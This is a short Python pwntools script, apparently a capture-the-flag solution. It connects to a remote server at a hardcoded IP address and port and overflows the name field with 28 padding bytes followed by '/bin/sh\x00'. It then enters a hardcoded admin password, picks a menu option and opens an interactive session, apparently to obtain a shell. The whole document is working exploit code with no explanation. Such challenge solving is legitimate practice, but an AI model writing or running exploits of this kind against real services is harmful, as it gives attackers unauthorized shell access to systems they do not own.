from pwn import *

p = remote('62.173.140.174', '17500')

payload = b'Oleg' + 28 * b'A' + b'/bin/sh\x00'

p.recvuntil(b'Enter a name: ', timeout=1)
p.sendline(payload)
p.recvuntil(b'Enter a password: ', timeout=1)
p.sendline(b'Super_Oleg_admin')
p.recvuntil(b'Select item (1-3): ', timeout=1)
p.sendline(b'2') 

p.interactive()

